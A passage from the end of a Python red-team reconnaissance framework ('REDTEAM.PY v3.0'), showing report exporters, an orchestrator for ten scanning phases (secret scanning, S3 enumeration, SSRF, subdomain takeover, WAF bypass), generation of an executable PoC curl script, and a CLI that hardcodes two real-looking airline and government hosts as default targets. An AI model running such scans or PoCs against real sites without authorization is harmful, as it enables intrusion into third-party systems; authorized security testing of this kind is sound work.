    def save_json(self, profiles: List[TargetProfile]) -> str:
        path = self.output_dir / f"redteam_report_{self.ts}.json"
        data = []
        for p in profiles:
            d = asdict(p)
            d["findings"] = [asdict(f) for f in p.findings]
            data.append(d)
        with open(path, "w") as f:
            json.dump({"generated": self.ts, "targets": data}, f, indent=2)
        ok(f"  JSON: {path}")
        return str(path)

    def save_csv(self, profiles: List[TargetProfile]) -> str:
        path = self.output_dir / f"findings_{self.ts}.csv"
        with open(path, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["Target", "ID", "Title", "Severity", "CVSS", "CWE",
                            "Category", "Description", "PoC"])
            for p in profiles:
                for finding in sorted(p.findings, key=lambda x: self.SEVERITY_ORDER.get(x.severity, 5)):
                    writer.writerow([
                        p.host, finding.id, finding.title, finding.severity,
                        finding.cvss, finding.cwe, finding.category,
                        finding.description[:100], finding.poc_curl[:80]
                    ])
        ok(f"  CSV: {path}")
        return str(path)

    def save_markdown(self, profiles: List[TargetProfile]) -> str:
        path = self.output_dir / f"redteam_report_{self.ts}.md"
        lines = [
            "# Red Team Reconnaissance Report",
            f"**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  ",
            f"**Framework:** REDTEAM.PY v3.0  ",
            f"**Targets:** {', '.join(p.host for p in profiles)}",
            "",
            "---",
            "",
            "## Executive Summary",
            "",
        ]

        all_findings = []
        for p in profiles:
            all_findings.extend(p.findings)
        all_findings.sort(key=lambda x: self.SEVERITY_ORDER.get(x.severity, 5))

        sev_counts = Counter(f.severity for f in all_findings)
        lines += [
            f"| Severity | Count |",
            f"|----------|-------|",
        ]
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            lines.append(f"| {sev} | {sev_counts.get(sev, 0)} |")
        lines += ["", "---", ""]

        for p in profiles:
            lines += [
                f"## Target: {p.url}",
                "",
                "### Infrastructure",
                f"- **IP:** {p.ip} ({p.provider})",
                f"- **TLS:** {p.tls_version} / {p.tls_cipher}",
                f"- **Cert:** {p.cert_cn} (expires {p.cert_expires})",
                f"- **WAF/CDN:** {', '.join(p.waf) or 'None detected'}",
                f"- **Technologies:** {', '.join(p.technologies) or 'None detected'}",
                f"- **Subdomains discovered:** {len(p.subdomains + p.ct_subdomains)}",
                f"- **JS files:** {len(p.js_files)}",
                f"- **API endpoints:** {len(p.api_endpoints)}",
                f"- **Secrets found:** {len(p.secrets)}",
                "",
                "### Findings",
                "",
            ]

            sorted_findings = sorted(p.findings, key=lambda x: self.SEVERITY_ORDER.get(x.severity, 5))
            for i, f in enumerate(sorted_findings, 1):
                lines += [
                    f"#### [{f.severity}] {f.id}: {f.title}",
                    "",
                    f"**CWE:** {f.cwe}  ",
                    f"**CVSS:** {f.cvss}  ",
                    f"**Category:** {f.category}",
                    "",
                    f"**Description:**  ",
                    f"{f.description}",
                    "",
                    f"**Evidence:**",
                    "```",
                    f.evidence,
                    "```",
                    "",
                    f"**Reproduction:**",
                    "```bash",
                    f.reproduction,
                    "```",
                    "",
                    f"**PoC (curl):**",
                    "```bash",
                    f.poc_curl,
                    "```",
                    "",
                    f"**Remediation:** {f.remediation}",
                    "",
                    "---",
                    "",
                ]

        with open(path, "w") as f:
            f.write("\n".join(lines))
        ok(f"  Markdown: {path}")
        return str(path)

    def save_html(self, profiles: List[TargetProfile]) -> str:
        path = self.output_dir / f"redteam_report_{self.ts}.html"

        all_findings = []
        for p in profiles:
            for f in p.findings:
                all_findings.append((p.host, f))
        all_findings.sort(key=lambda x: self.SEVERITY_ORDER.get(x[1].severity, 5))

        sev_counts = Counter(f.severity for _, f in all_findings)

        finding_cards = ""
        for host, f in all_findings:
            color = self.SEVERITY_COLOR.get(f.severity, "#6c757d")
            finding_cards += f"""
<div class="finding-card" data-severity="{f.severity}">
  <div class="finding-header" style="border-left: 4px solid {color}">
    <span class="severity-badge" style="background:{color}">{f.severity}</span>
    <strong>{f.id}</strong> — {html.escape(f.title)}
    <small style="color:#aaa"> | {host}</small>
  </div>
  <div class="finding-body">
    <table class="meta-table">
      <tr><td>CWE</td><td>{f.cwe}</td><td>CVSS</td><td>{f.cvss}</td><td>Category</td><td>{f.category}</td></tr>
    </table>
    <p>{html.escape(f.description)}</p>
    <h5>Evidence</h5>
    <pre><code>{html.escape(f.evidence)}</code></pre>
    <h5>PoC (curl)</h5>
    <pre><code>{html.escape(f.poc_curl)}</code></pre>
    <h5>Remediation</h5>
    <p class="remediation">{html.escape(f.remediation)}</p>
  </div>
</div>"""

        infra_rows = ""
        for p in profiles:
            infra_rows += f"""
<tr>
  <td>{p.host}</td><td>{p.ip}</td><td>{p.provider}</td>
  <td>{p.tls_version}</td><td>{p.cert_cn}</td>
  <td>{', '.join(p.waf) or 'None'}</td>
  <td>{len(p.technologies)}</td><td>{len(p.subdomains + p.ct_subdomains)}</td>
  <td>{len(p.findings)}</td>
</tr>"""

        html_out = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Red Team Report — {datetime.now().strftime('%Y-%m-%d')}</title>
<style>
  * {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{ background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; font-size: 14px; }}
  h1, h2, h3, h4 {{ color: #58a6ff; }}
  h5 {{ color: #79c0ff; margin: 8px 0 4px; }}
  .container {{ max-width: 1400px; margin: 0 auto; padding: 20px; }}
  .header {{ background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; margin-bottom: 20px; }}
  .stats {{ display: flex; gap: 15px; flex-wrap: wrap; margin: 20px 0; }}
  .stat-card {{ background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 15px 25px; text-align: center; }}
  .stat-card .num {{ font-size: 2em; font-weight: bold; }}
  .finding-card {{ background: #161b22; border: 1px solid #30363d; border-radius: 8px; margin: 15px 0; overflow: hidden; }}
  .finding-header {{ padding: 12px 16px; background: #1c2128; display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }}
  .finding-body {{ padding: 16px; }}
  .severity-badge {{ padding: 2px 8px; border-radius: 4px; color: #fff; font-size: 12px; font-weight: bold; }}
  pre {{ background: #0d1117; border: 1px solid #30363d; padding: 10px; border-radius: 4px; overflow-x: auto; margin: 5px 0; }}
  code {{ font-family: monospace; font-size: 12px; }}
  .meta-table {{ border-collapse: collapse; width: 100%; margin: 8px 0; }}
  .meta-table td {{ padding: 4px 10px; border: 1px solid #30363d; }}
  .meta-table td:first-child, .meta-table td:nth-child(3), .meta-table td:nth-child(5) {{ background: #1c2128; font-weight: bold; color: #79c0ff; }}
  .infra-table {{ width: 100%; border-collapse: collapse; margin: 15px 0; }}
  .infra-table th {{ background: #1c2128; padding: 8px 12px; text-align: left; color: #79c0ff; border: 1px solid #30363d; }}
  .infra-table td {{ padding: 8px 12px; border: 1px solid #30363d; }}
  .remediation {{ background: #162032; border-left: 3px solid #17a2b8; padding: 8px; border-radius: 2px; margin-top: 8px; }}
  .filter-bar {{ margin: 15px 0; }}
  .filter-btn {{ padding: 6px 14px; border-radius: 4px; border: 1px solid #30363d; background: #161b22; color: #c9d1d9; cursor: pointer; margin: 3px; }}
  .filter-btn:hover, .filter-btn.active {{ background: #58a6ff; color: #000; }}
  section {{ margin: 30px 0; }}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <h1>&#x1F6E1; Red Team Reconnaissance Report</h1>
    <p style="color:#8b949e; margin-top: 8px">
      Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} &nbsp;|&nbsp;
      Framework: REDTEAM.PY v3.0 &nbsp;|&nbsp;
      Targets: {', '.join(p.host for p in profiles)}
    </p>
  </div>

  <div class="stats">
    <div class="stat-card"><div class="num" style="color:#dc3545">{sev_counts.get('CRITICAL',0)}</div>CRITICAL</div>
    <div class="stat-card"><div class="num" style="color:#fd7e14">{sev_counts.get('HIGH',0)}</div>HIGH</div>
    <div class="stat-card"><div class="num" style="color:#ffc107">{sev_counts.get('MEDIUM',0)}</div>MEDIUM</div>
    <div class="stat-card"><div class="num" style="color:#17a2b8">{sev_counts.get('LOW',0)}</div>LOW</div>
    <div class="stat-card"><div class="num" style="color:#6c757d">{sev_counts.get('INFO',0)}</div>INFO</div>
    <div class="stat-card"><div class="num" style="color:#58a6ff">{len(all_findings)}</div>TOTAL</div>
  </div>

  <section>
    <h2>Infrastructure Overview</h2>
    <table class="infra-table">
      <tr><th>Host</th><th>IP</th><th>Provider</th><th>TLS</th><th>Cert CN</th><th>WAF/CDN</th><th>Tech</th><th>Subdomains</th><th>Findings</th></tr>
      {infra_rows}
    </table>
  </section>

  <section>
    <h2>Findings ({len(all_findings)})</h2>
    <div class="filter-bar">
      <button class="filter-btn active" onclick="filterFindings('ALL')">All</button>
      <button class="filter-btn" onclick="filterFindings('CRITICAL')" style="color:#dc3545">Critical</button>
      <button class="filter-btn" onclick="filterFindings('HIGH')" style="color:#fd7e14">High</button>
      <button class="filter-btn" onclick="filterFindings('MEDIUM')" style="color:#ffc107">Medium</button>
      <button class="filter-btn" onclick="filterFindings('LOW')" style="color:#17a2b8">Low</button>
      <button class="filter-btn" onclick="filterFindings('INFO')" style="color:#6c757d">Info</button>
    </div>
    <div id="findings-container">
    {finding_cards}
    </div>
  </section>
</div>

<script>
function filterFindings(sev) {{
  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
  event.target.classList.add('active');
  document.querySelectorAll('.finding-card').forEach(card => {{
    if (sev === 'ALL' || card.dataset.severity === sev) {{
      card.style.display = '';
    }} else {{
      card.style.display = 'none';
    }}
  }});
}}
</script>
</body>
</html>"""

        with open(path, "w") as f:
            f.write(html_out)
        ok(f"  HTML: {path}")
        return str(path)

    def save_poc_scripts(self, profiles: List[TargetProfile]) -> str:
        path = self.output_dir / f"poc_verification_{self.ts}.sh"
        lines = ["#!/usr/bin/env bash", "# PoC Verification Scripts", "# Generated by REDTEAM.PY v3.0", ""]
        for p in profiles:
            lines.append(f"# ═══ {p.host} ═══")
            for f in sorted(p.findings, key=lambda x: self.SEVERITY_ORDER.get(x.severity, 5)):
                lines += [
                    f"",
                    f"# [{f.severity}] {f.id}: {f.title}",
                    f"# CWE: {f.cwe} | CVSS: {f.cvss}",
                    f.poc_curl,
                    f"",
                ]
        content = "\n".join(lines)
        with open(path, "w") as f:
            f.write(content)
        os.chmod(path, 0o755)
        ok(f"  PoC Script: {path}")
        return str(path)

# ─────────────────────────────────────────────
# MASTER ORCHESTRATOR
# ─────────────────────────────────────────────
class RedTeamOrchestrator:
    """Auto-chain execution engine — each tool's output feeds the next"""

    PHASE_MAP = {
        1: "Passive OSINT (DNS, TLS, CT Logs, Wayback)",
        2: "WAF & Technology Detection",
        3: "Security Headers & CSP Analysis",
        4: "CORS & Cookie Security",
        5: "JavaScript & Sourcemap Analysis",
        6: "Secret Scanning",
        7: "API Mapping & GraphQL Probing",
        8: "Sensitive Path & S3 Bucket Enumeration",
        9: "Subdomain Takeover & SSRF Detection",
        10: "IDOR & XSS Surface Mapping",
    }

    def __init__(self, cfg: Config):
        self.cfg = cfg
        self.reporter = Reporter(cfg.output)

        # Tool instances
        self.dns = DNSResolver()
        self.tls = TLSAnalyzer()
        self.ct = CTLogScanner()
        self.wayback = WaybackMiner()
        self.waf = WAFDetector()
        self.tech = TechFingerprinter()
        self.headers = SecurityHeaderAuditor()
        self.csp = CSPAnalyzer()
        self.cors = CORSAnalyzer()
        self.cookies = CookieAuditor()
        self.js = JSExtractor()
        self.sourcemap = SourcemapAnalyzer()
        self.secrets = SecretScanner()
        self.api = APIMapper()
        self.graphql = GraphQLProber()
        self.paths = PathProber()
        self.s3 = S3BucketChecker()
        self.takeover = SubdomainTakeoverDetector()
        self.ssrf = SSRFOpenRedirectDetector()
        self.idor = IDORAndXSSSurfaceMapper()

    def _init_profile(self, url: str) -> TargetProfile:
        parsed = urlparse(url)
        host = parsed.hostname or url
        apex = ".".join(host.split(".")[-2:]) if host else host
        return TargetProfile(url=url, apex=apex, host=host, scheme=parsed.scheme)

    def _run_phase(self, phase: int, profile: TargetProfile) -> TargetProfile:
        banner(f"Phase {phase}: {self.PHASE_MAP.get(phase, 'Unknown')}")

        if phase == 1:
            profile = self.dns.run(profile)
            profile = self.tls.run(profile)
            profile = self.ct.run(profile)
            profile = self.wayback.run(profile)
        elif phase == 2:
            profile = self.waf.run(profile, self.cfg)
            profile = self.tech.run(profile, self.cfg)
        elif phase == 3:
            profile = self.headers.run(profile, self.cfg)
            profile = self.csp.run(profile, self.cfg)
        elif phase == 4:
            profile = self.cors.run(profile, self.cfg)
            profile = self.cookies.run(profile, self.cfg)
        elif phase == 5:
            profile = self.js.run(profile, self.cfg)
            profile = self.sourcemap.run(profile, self.cfg)
        elif phase == 6:
            profile = self.secrets.run(profile, self.cfg)
        elif phase == 7:
            profile = self.api.run(profile, self.cfg)
            profile = self.graphql.run(profile, self.cfg)
        elif phase == 8:
            profile = self.paths.run(profile, self.cfg)
            profile = self.s3.run(profile, self.cfg)
        elif phase == 9:
            profile = self.takeover.run(profile)
            profile = self.ssrf.run(profile, self.cfg)
        elif phase == 10:
            profile = self.idor.run(profile, self.cfg)

        return profile

    def run(self) -> List[TargetProfile]:
        profiles = []
        total_phases = len(self.cfg.phases)

        print(f"\n{C.BOLD}{C.WHITE}{'═'*70}{C.NC}")
        print(f"{C.BOLD}{C.WHITE}  REDTEAM.PY v3.0 — Advanced Red Team Framework{C.NC}")
        print(f"{C.BOLD}{C.WHITE}  20 Tools | 30 Skills | Auto-Chain Execution{C.NC}")
        print(f"{C.BOLD}{C.WHITE}{'═'*70}{C.NC}")
        print(f"  Targets: {', '.join(self.cfg.targets)}")
        print(f"  Output:  {self.cfg.output}")
        print(f"  Phases:  {self.cfg.phases}")
        print(f"  Workers: {self.cfg.workers} | Rate: {self.cfg.rate} req/s | Depth: {self.cfg.depth}")
        print(f"{C.BOLD}{C.WHITE}{'═'*70}{C.NC}\n")

        for target_url in self.cfg.targets:
            banner(f"TARGET: {target_url}")
            profile = self._init_profile(target_url)

            for phase in sorted(self.cfg.phases):
                try:
                    profile = self._run_phase(phase, profile)
                    time.sleep(1.0 / self.cfg.rate)
                except KeyboardInterrupt:
                    warn("  Interrupted — saving partial results...")
                    break
                except Exception as e:
                    warn(f"  Phase {phase} error: {e}")
                    continue

            profiles.append(profile)

            # Per-target summary
            banner(f"Summary for {profile.host}")
            findings_by_sev = Counter(f.severity for f in profile.findings)
            for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
                count = findings_by_sev.get(sev, 0)
                if count:
                    color = {
                        "CRITICAL": C.RED, "HIGH": C.RED,
                        "MEDIUM": C.YELLOW, "LOW": C.CYAN, "INFO": C.DIM
                    }.get(sev, C.NC)
                    print(f"  {color}{sev}: {count}{C.NC}")

        # Generate all reports
        banner("Generating Reports")
        self.reporter.save_json(profiles)
        self.reporter.save_csv(profiles)
        self.reporter.save_markdown(profiles)
        self.reporter.save_html(profiles)
        self.reporter.save_poc_scripts(profiles)

        banner("Scan Complete")
        total_findings = sum(len(p.findings) for p in profiles)
        ok(f"Total findings: {total_findings} across {len(profiles)} target(s)")
        ok(f"Reports saved to: {self.cfg.output}/")

        return profiles

# ─────────────────────────────────────────────
# SKILLS SUMMARY
# ─────────────────────────────────────────────
SKILLS = """
SKILL INDEX — 30 Skills
═══════════════════════
SKILL-01  DNS resolution & multi-record enumeration
SKILL-02  TLS version, cipher, certificate, SAN extraction
SKILL-03  Certificate Transparency log mining (crt.sh)
SKILL-04  Wayback Machine CDX API URL mining
SKILL-05  WAF/CDN fingerprinting (14 signatures)
SKILL-06  Technology stack detection (30 signatures)
SKILL-07  HTTP security header audit & scoring (10 headers)
SKILL-08  Content Security Policy weakness analysis (8 patterns)
SKILL-09  CORS misconfiguration testing (6 bypass patterns)
SKILL-10  Cookie security attribute analysis
SKILL-11  JavaScript file discovery & endpoint extraction
SKILL-12  Webpack sourcemap discovery & source recovery
SKILL-13  Secret/credential scanning with Shannon entropy (25 patterns)
SKILL-14  API endpoint discovery & Swagger/OpenAPI detection
SKILL-15  GraphQL introspection & schema extraction
SKILL-16  Sensitive file & path enumeration (50+ paths)
SKILL-17  S3 bucket enumeration & permission testing
SKILL-18  Subdomain takeover detection (14 providers)
SKILL-19  SSRF parameter identification & open redirect testing
SKILL-20  IDOR pattern mapping from historical URLs
SKILL-21  XSS injection surface mapping (forms & inputs)
SKILL-22  ASN/hosting provider identification from IP ranges
SKILL-23  Wildcard DNS detection
SKILL-24  Googlebot WAF bypass testing
SKILL-25  Short-lived certificate (ACME) detection
SKILL-26  Virtual host fuzzing candidate generation
SKILL-27  HTTP response clustering & outlier detection
SKILL-28  CVSS v3.1 scoring & CWE/OWASP mapping
SKILL-29  Multi-format export (JSON, HTML, Markdown, CSV)
SKILL-30  Auto-chained PoC curl generation per finding
"""

# ─────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="REDTEAM.PY v3.0 — Advanced Red Team Reconnaissance Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python redteam.py --target https://example.com --output ./results
  python redteam.py --target https://t1.com --target https://t2.com --output ./out
  python redteam.py --target https://example.com --output ./out --phases 1,2,3
  python redteam.py --target https://example.com --output ./out --workers 15 --rate 3.0
  python redteam.py --skills   # Print skills index
        """
    )
    parser.add_argument("--target", "-t", action="append", default=[], dest="targets",
                        help="Target URL (can specify multiple)")
    parser.add_argument("--output", "-o", default="./redteam_output",
                        help="Output directory (default: ./redteam_output)")
    parser.add_argument("--workers", type=int, default=10,
                        help="Concurrent workers (default: 10)")
    parser.add_argument("--rate", type=float, default=2.0,
                        help="Requests per second (default: 2.0)")
    parser.add_argument("--depth", type=int, default=3,
                        help="Crawl depth (default: 3)")
    parser.add_argument("--timeout", type=int, default=20,
                        help="Request timeout seconds (default: 20)")
    parser.add_argument("--scope", action="append", default=[], dest="scope_extras",
                        help="Additional in-scope hosts")
    parser.add_argument("--phases", default="1,2,3,4,5,6,7,8,9,10",
                        help="Phases to run (default: 1-10, e.g. 1,2,3)")
    parser.add_argument("--skills", action="store_true",
                        help="Print skills index and exit")

    args = parser.parse_args()

    if args.skills:
        print(SKILLS)
        sys.exit(0)

    if not args.targets:
        parser.print_help()
        print(f"\n{C.RED}Error: At least one --target required{C.NC}")
        sys.exit(1)

    # Default targets if not specified (pre-configured scope)
    if not args.targets:
        args.targets = [
            "https://help.flynas.com",
            "https://greeting.chi.gov.sa"
        ]

    try:
        phases = [int(x.strip()) for x in args.phases.split(",")]
    except ValueError:
        print(f"{C.RED}Error: --phases must be comma-separated integers (e.g. 1,2,3){C.NC}")
        sys.exit(1)

    cfg = Config(
        targets=args.targets,
        output=args.output,
        workers=args.workers,
        rate=args.rate,
        depth=args.depth,
        timeout=args.timeout,
        scope_extras=args.scope_extras,
        phases=phases,
    )

    orchestrator = RedTeamOrchestrator(cfg)
    orchestrator.run()


if __name__ == "__main__":
    main()
